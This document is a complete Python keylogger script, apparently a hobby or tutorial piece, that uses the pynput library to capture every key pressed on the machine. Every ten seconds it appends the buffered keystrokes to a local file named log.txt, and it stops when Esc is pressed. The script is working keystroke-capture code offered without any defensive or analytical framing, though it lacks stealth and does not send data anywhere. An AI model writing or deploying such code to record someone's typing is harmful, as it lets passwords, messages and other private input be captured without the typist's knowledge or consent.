import time
import pynput
from pynput.keyboard import Key, Listener

key_register = []
run_time = int(time.time())
interval = 10

def time_check():
    global run_time, interval
    elapsed_time = int(time.time())
    if elapsed_time >= (run_time + interval):
        run_time = int(time.time())
        return True
    else:
        return False

def on_press(key):
    global key_register
    key_register.append(key)
    if time_check() == True:
        save_keys(key_register)
        key_register = []

def on_release(key):
    if key == Key.esc:
        return False

def save_keys(key_register):
    try:
        with open("Keylogger/log.txt", "a") as f:
            for key in key_register:
                f.write(str(key)) 
    except:
        with open("Keylogger/log.txt", "w") as f:
            for key in key_register:
                f.write(str(key))

with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()